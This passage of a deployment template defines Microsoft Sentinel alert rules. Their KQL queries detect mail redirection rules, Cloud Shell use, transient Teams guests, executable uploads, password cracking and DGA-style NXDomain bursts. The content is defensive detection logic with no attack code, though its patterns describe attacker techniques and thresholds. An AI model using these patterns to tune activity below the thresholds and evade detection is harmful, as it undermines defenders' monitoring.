          "query": "let ingested_lookback = 8h;     // earliest [ingest time] boundary\nlet generated_lookback = 10h;   // earliest [log time] boundary\nOfficeActivity\n| where TimeGenerated > ago(generated_lookback) and ingestion_time() > ago(ingested_lookback)\n| where OfficeWorkload =~ 'Exchange'\n| where Operation in~ ('New-TransportRule', 'Set-TransportRule')\n| extend p = parse_json(Parameters)\n| extend RuleName = case(\n  Operation =~ 'Set-TransportRule', tostring(OfficeObjectId),\n  Operation =~ 'New-TransportRule', tostring(p[1].Value),\n  'Unknown'\n  ) \n| mvexpand p\n| extend action = p.Name\n| where (action =~ 'BlindCopyTo' or action =~ 'RedirectMessageTo') and isnotempty(p.Value)\n| extend action = strcat(Operation,' (',RuleName,') -> ',action,': ',p.Value)\n| extend ClientIP = case( \n  ClientIP has '.' and ClientIP has ':', tostring(split(ClientIP,':')[0]), \n  ClientIP has '.' and ClientIP has '-', tostring(split(ClientIP,'-')[0]), \n  ClientIP has '[', tostring(trim_start(@'[[]',tostring(split(ClientIP,']')[0]))),\n  ClientIP\n  )  \n| project TimeGenerated, action, ClientIP, UserId\n| extend AccountCustomEntity = UserId\n| summarize EventCount=count(), StartTime=min(TimeGenerated), EndTime=max(TimeGenerated),\n  IPLists=make_set(ClientIP),\n  action=make_set(action)\n  by AccountCustomEntity, bin(TimeGenerated,8h)",
          "queryFrequency": "PT8H",
          "queryPeriod": "PT10H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-557')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-557')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-557: [RBA] Azure Activity - Use of Azure Cloud Shell",
          "description": "Identifies when users are user Azure Cloud Shell to perform Azure activities. MITRE: T1059 Category: Azure Activity tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let generated_lookback = 2h;\nlet ingested_lookback = 1h;\nAzureActivity\n| where TimeGenerated between(ago(generated_lookback)..now()) and ingestion_time() > ago(ingested_lookback)\n| where ActivityStatusValue =~ 'Started'\n| where ResourceGroup startswith 'CLOUD-SHELL'\n| parse Caller with UserName '@' UserDNSDomain \n| where UserName !in~ (A557_EXCLUDE_ACCOUNT)\n| extend Action = tostring(parse_json(Authorization).action)\n| extend OperationNameValue = iff(isempty(OperationNameValue), Action, OperationNameValue)\n| summarize Count=count(),Last=max(TimeGenerated),Actions=make_set(OperationNameValue),FiveEvents=make_set(pack_all(),MaxSize=5) by ResourceGroup, AccountCustomEntity =  Caller , UserName, UserDNSDomain, IPCustomEntity = CallerIpAddress , bin(TimeGenerated,1h)\n| project\n    TimeGenerated,\n    Last,\n    ResourceGroup,\n    AccountCustomEntity,\n    UserName,\n    UserDNSDomain,\n    IPCustomEntity,\n    Count,\n    Actions,\n    FiveEvents",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-480')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-480')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-480: [RBA] O365 - Teams External users added then removed",
          "description": "Attackers with some level of existing access might also look to add an external account to Teams in order to access or exfiltrate data before removing that user to hide the access. MITRE: T1136 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let time_ago = 2d; \nlet time_delta = 1h; \nOfficeActivity\n| where TimeGenerated > ago(time_ago) \n| where OfficeWorkload =~ 'MicrosoftTeams'\n| where Operation =~ 'MemberAdded' \n| extend UPN = tostring(parse_json(Members)[0].UPN) \n| extend UserDomain = tolower(extract('.+(@.+)',1,UPN))\n| where UserDomain !in~ (DOMAINS)\n| project TimeAdded=TimeGenerated, Operation, UPN, UserWhoAdded = UserId, TeamName, TeamGuid, UserDomain\n| join ( \nOfficeActivity\n| where TimeGenerated > ago(1d) \n| where OfficeWorkload =~ 'MicrosoftTeams'\n| where Operation =~ 'MemberRemoved' \n| extend UPN = tostring(parse_json(Members)[0].UPN) \n| extend UserDomain = tolower(extract('.+(@.+)',1,UPN))\n| where UserDomain !in~ (DOMAINS)\n| project TimeDeleted=TimeGenerated, Operation, UPN, UserWhoDeleted = UserId, TeamName, TeamGuid, UserDomain) on UPN, TeamGuid\n| where TimeDeleted < (TimeAdded + time_delta) \n| project TimeAdded, TimeDeleted, AccountCustomEntity=UPN, UserWhoAdded, UserWhoDeleted, TeamName, TeamGuid , UserDomain",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1136"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-190')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-190')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-190: [RBA] O365 - New executable via Office FileUploaded Operation",
          "description": "Identifies when executable file types are uploaded to Office services such as SharePoint and OneDrive. List currently includes 'exe', 'inf', 'gzip', 'cmd', 'bat' file extensions. Additionally, identifies when a given user is uploading these files to another users workspace. This may be indication of a staging location for malware or other malicious activity. MITRE: T1204 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "// a threshold can be enabled, see commented line below for PrevSeenCount\nlet threshold = 2;\nlet uploadOp = 'FileUploaded';\n// Extensions that are interesting. Add/Remove to this list as you see fit\nlet execExt = dynamic(['exe', 'inf', 'gzip', 'cmd', 'bat']);\nlet starttime = 8d;\nlet endtime = 1d;\nOfficeActivity | where TimeGenerated between(startofday(ago(1d))..endofday(ago(1d)))\n// Limited to File Uploads due to potential noise, comment out the Operation statement below to include any operation type\n// Additional, but potentially noisy operation types that include Uploads and Downloads can be included by adding the following - Operation contains \"upload\" or Operation contains \"download\"\n| where Operation =~ uploadOp\n| where SourceFileExtension has_any (execExt)\n| project TimeGenerated, OfficeId, OfficeWorkload, RecordType, Operation, UserType, UserKey, UserId, ClientIP, UserAgent, Site_Url, SourceRelativeUrl, SourceFileName\n| join kind= leftanti (\nOfficeActivity | where TimeGenerated between (startofday(ago(starttime)) .. startofday(ago(endtime)))\n| where Operation =~ uploadOp\n| where SourceFileExtension has_any (execExt)\n| summarize SourceRelativeUrl = make_set(SourceRelativeUrl), UserId = make_set(UserId) , PrevSeenCount = count() by SourceFileName\n// To exclude previous matches when only above a specific count, change threshold above and uncomment the line below\n//| where PrevSeenCount > threshold\n| mvexpand SourceRelativeUrl, UserId\n| extend SourceRelativeUrl = tostring(SourceRelativeUrl), UserId = tostring(UserId)\n) on SourceFileName, SourceRelativeUrl, UserId \n| extend SiteUrlUserFolder = tolower(split(Site_Url, '/')[-2])\n| extend UserIdUserFolderFormat = tolower(replace('@|\\\\.', '_',UserId))\n// identify when UserId is not a match to the specific site url personal folder reference\n| extend UserIdDiffThanUserFolder = iff(Site_Url has '/personal/' and SiteUrlUserFolder != UserIdUserFolderFormat, true , false ) \n| summarize TimeGenerated = make_list(TimeGenerated), StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), \nUserAgents = make_list(UserAgent), OfficeIds = make_list(OfficeId), SourceRelativeUrls = make_list(SourceRelativeUrl), FileNames = make_list(SourceFileName)\nby OfficeWorkload, RecordType, Operation, UserType, UserKey, UserId, ClientIP, Site_Url, SiteUrlUserFolder, UserIdUserFolderFormat, UserIdDiffThanUserFolder\n| extend AccountCustomEntity = UserId\n| extend IPCustomEntity = ClientIP\n| extend URLCustomEntity = Site_Url",
          "queryFrequency": "P1D",
          "queryPeriod": "P8D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1204"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "URLCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-240')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-240')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-240: [RBA] Azure Security Center - Endpoint Protection Threat Detected",
          "description": "This alert will create a SOC or RBA event based on endpoint protection events collected by Azure Security Center Protection Status.\n\nhttps://docs.microsoft.com/en-us/azure/azure-monitor/reference/tables/protectionstatus\n\nSOC: Malware was not blocked/cleaned by the anti-virus solution and has not been previously excluded.\n\nRBA: Remediated by the anti-virus solution or previously excluded.\n\nCheck the anti-virus vendor for additional alerts and details.\n\nExclusions:\n\n1. A240_EXCLUDED_PATHS: Regex for file path\n2. A240_EXCUDED_FILES: List of files with full path MITRE: T1204 Category: Azure Security Center Protection Status tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let alert_id = 'BV-240';      \nlet start_time = 1h;\nlet start_time_suppress = 1d;\nlet end_time = now();\nlet alert_bin = 1h;\nlet global_config = dynamic({});\nlet excluded_description_fields = dynamic([]);\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n}; \nlet exclusions = array_concat(global_config['EXCLUSION'], BV240_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};                 \nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV240_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nProtectionStatus\n| where TimeGenerated between (ago(start_time) .. now())\n| where ProtectionStatusDetails =~ 'At least one threat detected'\n| extend Blocked = iff(ThreatStatus !~ 'Active', true, false)\n| parse ThreatStatusDetails with Action '; ' * 'Resources:' Resources\n| extend Files = extract_all(@'file\\:\\_([^\\.]+\\S+)', Resources)\n| extend Excluded_File = iff(array_length(set_difference(A240_EXCLUDED_FILES, Files)) == 0, true, false)\n| extend Excluded_Path = iff(Files matches regex A240_EXCLUDED_PATHS, true, false)\n| where Excluded_File and Excluded_Path\n| project TimeGenerated, SourceComputerId, OSName, Threat, ThreatStatus, TypeofProtection, Computer, ComputerIP_Hidden, ComputerEnvironment, Blocked, Action, Files\n| summarize TimeGenerated=min(TimeGenerated), Files=make_set(Files) by Computer, ComputerIP_Hidden, bin(TimeGenerated, alert_bin)\n| extend File1 = tostring(Files[0]), File2 = tostring(Files[1])\n| extend FileName1 = extract(@'.*\\\\(.*)$',1,File1)\n| extend FileName2 = extract(@'.*\\\\(.*)$',1,File2)\n| extend IPAddress = ComputerIP_Hidden\n| parse Computer with bv_src_dvc_hostname '.' bv_src_dvc_domain\n| project bv_start_time = TimeGenerated\n      , bv_src_dvc = Computer\n      , bv_src_ip = IPAddress \n      , bv_src_file = Files\n      , bv_src_file1 = FileName1\n      , bv_src_file2 = FileName2\n      , bv_src_dvc_hostname \n      , bv_src_dvc_domain\n| invoke description(excluded_description_fields)\n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'\n| invoke rba_score_calculator(alert_id)\n| extend bv_alarm_victim_entities = pack_array(bv_src_ip, bv_src_dvc)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_ip, bv_src_dvc)\n| extend sourcetype = 'ProtectionStatus'\n| project-keep\n    bv_*\n    , ExtendedDescription\n    , sourcetype            ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1204"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-240: [RBA] Azure Security Center - Endpoint Protection Threat Detected",
            "alertDescriptionFormat": "This alert will create a SOC or RBA event based on endpoint protection events collected by Azure Security Center Protection Status.\n\nhttps://docs.microsoft.com/en-us/azure/azure-monitor/reference/tables/protectionstatus\n\nSOC: Malware was not blocked/cleaned by the anti-virus solution and has not been previously excluded.\n\nRBA: Remediated by the anti-virus solution or previously excluded.\n\nCheck the anti-virus vendor for additional alerts and details.\n\nExclusions:\n\n1. A240_EXCLUDED_PATHS: Regex for file path\n2. A240_EXCUDED_FILES: List of files with full path\n\n{{ExtendedDescription}}\n\ntag: RBA\n\nMITRE: T1204 Category: Azure Security Center Protection Status"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_file1"
                }
              ]
            },
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_file2"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc_hostname"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "bv_src_dvc_domain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-192')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-192')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-192: [RBA] Azure AD - Distributed Password Crack Attempt",
          "description": "This alert identifies distributed password cracking attempts from the Azure Active Directory SigninLogs. The query looks for unusually high number of failed password attempts coming from multiple locations for a user account. MITRE: T1110 Category: Azure AD tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 24h;\nlet latency = 48h;\nlet end_time = now();\nlet s_threshold = 30;\nlet l_threshold = 3;\nSigninLogs\n| where TimeGenerated between (ago(start_time+latency)..now()) and ingestion_time() > ago(start_time)\n| where OperationName =~ 'Sign-in activity'\n| where ResultType in ('50126', '50053' , '50055', '50056')\n| extend OS = DeviceDetail.operatingSystem, Browser = DeviceDetail.browser \n| extend LocationString= strcat(tostring(LocationDetails['countryOrRegion']), '/', tostring(LocationDetails['state']), '/', tostring(LocationDetails['city']))\n| summarize StartTimeUtc = min(TimeGenerated)\n, EndTimeUtc = max(TimeGenerated)\n, SigninCount=count()\n, LocationCount=dcount(LocationString) \n, IPAddress=make_set(IPAddress, 5)\n, LocationString=make_set(LocationString, 5)\n, ResultDescription=make_set(ResultDescription, 5)\n, AppDisplayName=make_set(AppDisplayName, 5)\n, Browser=make_set(Browser, 5)\n, OS=make_set(OS, 5) by UserPrincipalName\n| where SigninCount > s_threshold                                     \n| where LocationCount >= l_threshold\n| extend ExtendedDescription = strcat('A total of ', SigninCount, ' failed login attempts for user ', UserPrincipalName, ' were detected across ', LocationCount, ' unique locations' )\n| project StartTimeUtc, ExtendedDescription, EndTimeUtc, SigninCount, LocationCount, UserPrincipalName, IPAddress, LocationString, AppDisplayName, ResultDescription, Browser, OS",
          "queryFrequency": "P1D",
          "queryPeriod": "P3D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Identifies evidence of brute force activity against Azure AD by highlighting multiple authentication failures over multiple geolocations\n\n{{ExtendedDescription}}\n\nMITRE: T1110\ntag: RBA\nCategory: Azure AD"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserPrincipalName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-631')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-631')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-631: [RBA] Microsoft DNS - High NXDomain Count",
          "description": "Identifies clients with a high NXDomain count which could be indicative of a DGA (cycling through possible C2 domains where most C2s are not live). Alert is generated when a new IP is seen (based on not being seen associated with NXDomain records in prior 10-day baseline period) MITRE:  Category: Microsoft DNS tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let ingested_lookback = 1d; // earliest [ingest time] boundary\nlet generated_lookback = 2d; // earliest [log time] boundary\nlet nxDomainDnsEvents = materialize(DnsEvents \n|where TimeGenerated > ago(10d)\n|where ResultCode == '3'\n| where QueryType in~ ('A', 'AAAA')\n|project TimeGenerated,ingestion_time(),ClientIP,Name\n| where ClientIP != '127.0.0.1'\n| where Name !contains '/'\n| where Name contains '.'\n| where Name matches regex A631_EXCLUDED_DOMAINS == false)\n;\nnxDomainDnsEvents\n| where TimeGenerated > ago(generated_lookback) and ingestion_time() > ago(ingested_lookback)\n| extend sld = tostring(split(Name, '.')[-2])\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), dcount(sld) by ClientIP\n| where dcount_sld > 100\n// Filter out previously seen IPs\n| join kind=leftanti (nxDomainDnsEvents\n    | where TimeGenerated between(ago(10d)..ago(1d))\n    | extend sld = tostring(split(Name, '.')[-2])\n    | summarize dcount(sld) by ClientIP\n    | where dcount_sld > 100 ) on ClientIP\n// Pull out sample NXDomain responses for those remaining potentially infected IPs\n| join kind = inner (nxDomainDnsEvents | summarize by Name, ClientIP) on ClientIP\n| summarize StartTimeUtc = min(StartTimeUtc), EndTimeUtc = max(EndTimeUtc), sampleNXDomainList=make_list(Name, 100)  by ClientIP, dcount_sld\n| extend timestamp = StartTimeUtc, IPCustomEntity = ClientIP",
          "queryFrequency": "P1D",
          "queryPeriod": "P10D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-189')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-189')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-189: [RBA] Azure AD - GitHub Signin Burst",
          "description": "Sign-in bursts to GitHub from multiple locations. MITRE: T1078,T1213 Category: Azure AD tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let RunTime = 1h;\nSigninLogs\n| where TimeGenerated > ago(RunTime)\n| where AppDisplayName == \"GitHub.com\"\n| where ResultType == 0\n| summarize CountOfLocations = dcount(Location), Locations = make_set(Location), BurstStartTime = min(TimeGenerated), BurstEndTime = max(TimeGenerated) by UserPrincipalName\n| where CountOfLocations > 1\n| extend timestamp = BurstStartTime, AccountCustomEntity = UserPrincipalName",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1213"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
